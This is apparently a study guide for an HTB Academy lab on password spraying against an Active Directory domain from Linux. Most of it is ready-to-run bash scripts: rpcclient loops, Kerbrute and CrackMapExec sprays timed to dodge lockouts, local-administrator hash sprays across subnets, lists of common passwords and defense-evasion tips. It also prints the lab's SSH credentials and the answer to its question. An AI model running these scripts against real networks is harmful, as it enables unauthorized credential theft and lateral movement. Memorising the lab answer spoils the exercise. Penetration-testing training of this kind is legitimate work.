# Internal Password Spraying - from Linux

## 📋 Overview

Password spraying is one of the most effective methods for gaining initial domain credentials in Active Directory environments. This technique involves testing a small number of common passwords against a large list of usernames, staying below account lockout thresholds while maximizing the chance of success.

## 🎯 Attack Methodology

### ⚠️ **Critical Prerequisites**
- **Password Policy Knowledge**: Essential for safe execution
- **Valid User List**: Accurate username enumeration completed
- **Lockout Threshold**: Must stay below the limit (typically 3-5 attempts)
- **Attack Timing**: Space attempts based on lockout duration

### 🔍 **Attack Flow**
1. **User List Preparation**: Clean, validated username list
2. **Password Selection**: Common, policy-compliant passwords
3. **Attack Execution**: Systematic credential testing
4. **Success Validation**: Verify discovered credentials
5. **Documentation**: Log all activities and results

---

## 🔧 rpcclient Password Spraying

### 📝 **Basic Methodology**
- **Success Indicator**: `Authority Name` in response
- **Bash One-Liner**: Efficient automation approach
- **Filtering**: Grep for successful authentications only

### 🚀 **Single Password Spray**
```bash
# Basic rpcclient password spray
for u in $(cat valid_users.txt); do 
    rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done
```

### 📊 **Example Successful Output**
```
Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

### 🔧 **Enhanced Script with Logging**
```bash
#!/bin/bash
# Enhanced password spraying with logging

DC_IP="172.16.5.5"
USERLIST="valid_users.txt"
PASSWORD="Welcome1"
LOGFILE="spray_results_$(date +%Y%m%d_%H%M%S).log"

echo "[$(date)] Starting password spray against $DC_IP" | tee -a $LOGFILE
echo "[$(date)] Testing password: $PASSWORD" | tee -a $LOGFILE

for user in $(cat $USERLIST); do
    echo "[$(date)] Testing user: $user" >> $LOGFILE
    result=$(rpcclient -U "$user%$PASSWORD" -c "getusername;quit" $DC_IP 2>/dev/null)
    
    if echo "$result" | grep -q "Authority"; then
        echo "[SUCCESS] $user:$PASSWORD" | tee -a $LOGFILE
        echo "$result" >> $LOGFILE
    fi
done

echo "[$(date)] Password spray completed" | tee -a $LOGFILE
```

---

## 🎫 Kerbrute Password Spraying

### ⚡ **Key Advantages**
- **Speed**: Fastest password spraying method
- **Stealth**: Minimal event generation
- **Kerberos-Based**: Uses native authentication protocol
- **Clear Output**: Easy to identify successful logins

### 🚀 **Basic Kerbrute Spraying**
```bash
# Single password spray
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# Save results to file
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1 -o spray_results.txt

# Verbose output
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1 -v
```

### 📊 **Example Kerbrute Output**
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

### 🔄 **Multiple Password Spraying**
```bash
#!/bin/bash
# Multiple password spray with delays

PASSWORDS=("Welcome1" "Password1" "Company123" "Spring2024")
USERLIST="valid_users.txt"
DOMAIN="inlanefreight.local"
DC="172.16.5.5"
DELAY=35  # Minutes between sprays (based on lockout policy)

for password in "${PASSWORDS[@]}"; do
    echo "[$(date)] Testing password: $password"
    kerbrute passwordspray -d $DOMAIN --dc $DC $USERLIST $password -o "spray_$password.txt"
    
    # Check for successful logins
    if grep -q "VALID LOGIN" "spray_$password.txt"; then
        echo "[SUCCESS] Found valid credentials with password: $password"
        grep "VALID LOGIN" "spray_$password.txt"
    fi
    
    # Wait between attempts (except for last password)
    if [ "$password" != "${PASSWORDS[-1]}" ]; then
        echo "[$(date)] Waiting $DELAY minutes before next spray..."
        sleep ${DELAY}m
    fi
done
```

---

## 🔨 CrackMapExec Password Spraying

### 💪 **Key Features**
- **SMB-Based**: Uses SMB protocol for authentication
- **Bulk Testing**: Efficient user list processing
- **Success Filtering**: Easy identification of valid credentials
- **Immediate Validation**: Built-in credential verification

### 🚀 **Basic CrackMapExec Spraying**
```bash
# Single password against user list
crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +

# Multiple passwords (one at a time)
crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

### 📊 **Example Successful Output**
```
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

### ✅ **Credential Validation**
```bash
# Validate discovered credentials
crackmapexec smb 172.16.5.5 -u avazquez -p Password123

# Expected output:
# SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
# SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

### 🔧 **Advanced CrackMapExec Script**
```bash
#!/bin/bash
# Advanced CrackMapExec spraying with comprehensive logging

DC_IP="172.16.5.5"
USERLIST="valid_users.txt"
PASSWORDS=("Welcome1" "Password123" "Company2024")
LOGFILE="cme_spray_$(date +%Y%m%d_%H%M%S).log"

echo "[$(date)] Starting CrackMapExec password spray" | tee -a $LOGFILE
echo "[$(date)] Target: $DC_IP" | tee -a $LOGFILE
echo "[$(date)] User list: $USERLIST ($(wc -l < $USERLIST) users)" | tee -a $LOGFILE

for password in "${PASSWORDS[@]}"; do
    echo "[$(date)] Testing password: $password" | tee -a $LOGFILE
    
    # Run spray and capture results
    result=$(crackmapexec smb $DC_IP -u $USERLIST -p "$password" 2>&1)
    
    # Log full results
    echo "$result" >> $LOGFILE
    
    # Extract and display successes
    successes=$(echo "$result" | grep '\[+\]')
    if [ -n "$successes" ]; then
        echo "[SUCCESS] Found valid credentials:" | tee -a $LOGFILE
        echo "$successes" | tee -a $LOGFILE
        
        # Validate each successful credential
        echo "$successes" | while read -r line; do
            user=$(echo "$line" | grep -oP '\\\\[^\\]+\\\\K[^:]+')
            echo "[$(date)] Validating $user:$password" | tee -a $LOGFILE
            crackmapexec smb $DC_IP -u "$user" -p "$password" | tee -a $LOGFILE
        done
    fi
    
    echo "[$(date)] Completed testing password: $password" | tee -a $LOGFILE
    echo "----------------------------------------" | tee -a $LOGFILE
done
```

---

## 🏠 Local Administrator Password Reuse

### 🎯 **Attack Concept**
Local administrator accounts often have the same password across multiple systems due to:
- **Gold Images**: Automated deployments using templates
- **Management Ease**: Admins using same password everywhere
- **Legacy Practices**: Old password policies still in effect

### 🔍 **Target Prioritization**
- **High-Value Servers**: SQL, Exchange, file servers
- **Domain Controllers**: If accessible (high impact)
- **Management Systems**: SCCM, monitoring tools
- **Jump Boxes**: Administrative workstations

### 💥 **Hash-Based Spraying**
```bash
# Local admin hash spraying across subnet
crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

**Example Output:**
```
SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

### 🔧 **Comprehensive Local Admin Hunting**
```bash
#!/bin/bash
# Hunt for local admin password reuse

HASH="88ad09182de639ccc6579eb0849751cf"
SUBNETS=("172.16.5.0/24" "172.16.4.0/24" "10.10.10.0/24")
ACCOUNTS=("administrator" "admin" "localadmin")

for subnet in "${SUBNETS[@]}"; do
    echo "[$(date)] Testing subnet: $subnet"
    
    for account in "${ACCOUNTS[@]}"; do
        echo "[$(date)] Testing account: $account"
        
        crackmapexec smb --local-auth $subnet -u $account -H $HASH --threads 50 | grep '\[+\]' | tee -a "local_admin_reuse.log"
    done
done
```

### ⚠️ **Important Flags**
- `--local-auth`: Prevents domain account lockouts
- `--threads`: Controls connection speed
- `-H`: Uses NTLM hash instead of password

---

## 🎯 HTB Academy Lab Walkthrough

### 📝 Lab Question
*"Find the user account starting with the letter 's' that has the password Welcome1. Submit the username as your answer."*

### 🚀 Step-by-Step Solution

#### 1️⃣ **Connect to Attack Host**
```bash
# SSH to target
ssh htb-student@10.129.54.201
# Password: HTB_@cademy_stdnt!
```

#### 2️⃣ **Gather User List with enum4linux**
```bash
# Use enum4linux to gather usernames (exact HTB lab method)
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > validUsers.txt

# Verify the user list was created
cat validUsers.txt
wc -l validUsers.txt

# Alternative: If you have Kerbrute results from previous enumeration
# grep "VALID USERNAME" kerbrute_output.txt | awk '{print $4}' | cut -d'@' -f1 > valid_users.txt
```

#### 3️⃣ **Method 1: rpcclient Password Spray**
```bash
# Test Welcome1 password against all users
for u in $(cat validUsers.txt); do 
    rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done
```

#### 4️⃣ **Method 2: Kerbrute Password Spray (Recommended)**
```bash
# Most reliable method - exactly as shown in HTB lab
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 validUsers.txt Welcome1
```

#### 5️⃣ **Method 3: CrackMapExec**
```bash
# Alternative verification
crackmapexec smb 172.16.5.5 -u validUsers.txt -p Welcome1 | grep +
```

#### 6️⃣ **Expected Results**
Based on the lab content, you should see:

**enum4linux output (userlist creation):**
```bash
# validUsers.txt should contain usernames like:
administrator
guest
krbtgt
lab_adm
htb-student
sgage
avazquez
...
```

**Password spraying results:**
```bash
# rpcclient output:
Account Name: sgage, Authority Name: INLANEFREIGHT

# Kerbrute output (exactly from HTB lab):
[!] lab_adm@inlanefreight.local:Welcome1 - KDC_Error: KDC has no support for encryption type
[+] VALID LOGIN: sgage@inlanefreight.local:Welcome1
Done! Tested 21 logins (1 successes) in 0.061 seconds

# CrackMapExec output:
[+] INLANEFREIGHT.LOCAL\sgage:Welcome1
```

### ✅ **Answer**: `sgage`

#### 7️⃣ **Verification**
```bash
# Verify the discovered credentials
crackmapexec smb 172.16.5.5 -u sgage -p Welcome1

# Should show successful authentication
```

---

## 📊 Tool Comparison

| **Tool** | **Speed** | **Stealth** | **Accuracy** | **Features** | **Best Use Case** |
|----------|-----------|-------------|--------------|--------------|-------------------|
| **rpcclient** | Medium | Medium | High | Simple, reliable | Script automation |
| **Kerbrute** | Fast | High | High | Kerberos-based, minimal logs | Large-scale spraying |
| **CrackMapExec** | Medium | Low | High | Validation, local auth | Comprehensive testing |

---

## 🛡️ Security Considerations

### 🚨 **Event Generation**

| **Tool** | **Event IDs Generated** | **Detection Risk** |
|----------|------------------------|-------------------|
| **rpcclient** | 4625 (failures), 4624 (success) | Medium |
| **Kerbrute** | 4768 (TGT requests), 4771 (Pre-auth failed) | Low |
| **CrackMapExec** | 4625 (failures), 4624 (success), 4648 (explicit logon) | High |

### 🔍 **Defense Evasion**
- **Timing**: Space attempts based on lockout policy
- **User Selection**: Avoid high-privilege accounts initially
- **Password Selection**: Use policy-compliant passwords
- **Monitoring**: Watch for defensive responses

### 📈 **Detection Indicators**
- **Multiple authentication failures** from single source
- **Sequential login attempts** across user list
- **Unusual authentication timing** (outside business hours)
- **High volume of Event ID 4625** in short timeframe

---

## 🔐 Password Selection Strategy

### 🎯 **Common Effective Passwords**
```bash
# Season + Year + Complexity
Spring2024!
Summer2024!
Fall2024!
Winter2024!

# Company + Variations
CompanyName1
CompanyName123
CompanyName2024!

# Standard Weak Passwords
Welcome1
Password1
Password123
Admin123
```

### 📋 **Password Policy Compliance**
```bash
# For 8-character minimum, complexity enabled:
- Minimum 8 characters
- 3 out of 4 character types:
  - Uppercase letter
  - Lowercase letter  
  - Number
  - Special character

# Examples that meet typical policy:
Welcome1     # W(upper) + elcome(lower) + 1(number) = 3/4 types ✓
Password1    # P(upper) + assword(lower) + 1(number) = 3/4 types ✓
Company!     # C(upper) + ompany(lower) + !(special) = 3/4 types ✓
```

---

## 📝 Attack Documentation Template

### 📊 **Spray Session Log**
```
Date: 2024-01-15
Time: 14:30:00 UTC
Method: Kerbrute Password Spray
Target DC: 172.16.5.5
Domain: inlanefreight.local
User List: valid_users.txt (57 users)
Password Tested: Welcome1
Results: 1 success (sgage:Welcome1)
Duration: 0.172 seconds
Event Risk: Low (Kerberos-based)
```

### 🎯 **Success Tracking**
```bash
# Create success log
echo "Username:Password:Method:Timestamp" > successful_logins.log
echo "sgage:Welcome1:Kerbrute:$(date)" >> successful_logins.log

# Validate all successes
while IFS=: read -r user pass method timestamp; do
    if [ "$user" != "Username" ]; then
        echo "Validating $user:$pass"
        crackmapexec smb 172.16.5.5 -u "$user" -p "$pass"
    fi
done < successful_logins.log
```

---

## ⚡ Quick Reference Commands

### 🔧 **One-Liner Sprays**
```bash
# enum4linux user enumeration (HTB method)
enum4linux -U DC_IP | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > validUsers.txt

# rpcclient one-liner
for u in $(cat validUsers.txt); do rpcclient -U "$u%PASSWORD" -c "getusername;quit" DC_IP | grep Authority; done

# Kerbrute spray (most effective)
kerbrute passwordspray -d domain.local --dc DC_IP validUsers.txt PASSWORD

# CrackMapExec spray
crackmapexec smb DC_IP -u validUsers.txt -p PASSWORD | grep +

# Local admin hash spray
crackmapexec smb --local-auth SUBNET -u administrator -H HASH | grep +
```

### 🔍 **Result Extraction**
```bash
# Extract usernames from successful sprays
grep "VALID LOGIN" kerbrute_output.txt | awk '{print $4}' | cut -d'@' -f1

# Extract from CrackMapExec
grep '\[+\]' cme_output.txt | grep -oP '\\\\[^\\]+\\\\K[^:]+'

# Extract from rpcclient
grep "Authority Name" rpc_output.txt | awk '{print $3}' | cut -d',' -f1
```

---

## 🔑 Key Takeaways

### ✅ **Attack Best Practices**
- **Know the Policy**: Essential for safe execution
- **Multiple Tools**: Use different methods for verification
- **Proper Timing**: Space attempts to avoid lockouts
- **Documentation**: Log everything for client reporting

### ⚠️ **Critical Warnings**
- **Never Exceed Lockout Threshold**: Typically 3-5 attempts max
- **Monitor Bad Password Counts**: Check account status before spraying
- **Avoid High-Value Accounts**: Don't target admin accounts initially
- **Space Attempts**: Wait lockout duration + buffer between sprays

### 🎯 **Post-Success Actions**
1. **Immediate Validation**: Verify all discovered credentials
2. **Privilege Assessment**: Check user permissions and group memberships
3. **Access Expansion**: Use credentials for further enumeration
4. **Documentation**: Record all findings for reporting

---

*Password spraying success requires patience, methodology, and respect for account lockout policies - one successful credential can open the entire domain.* 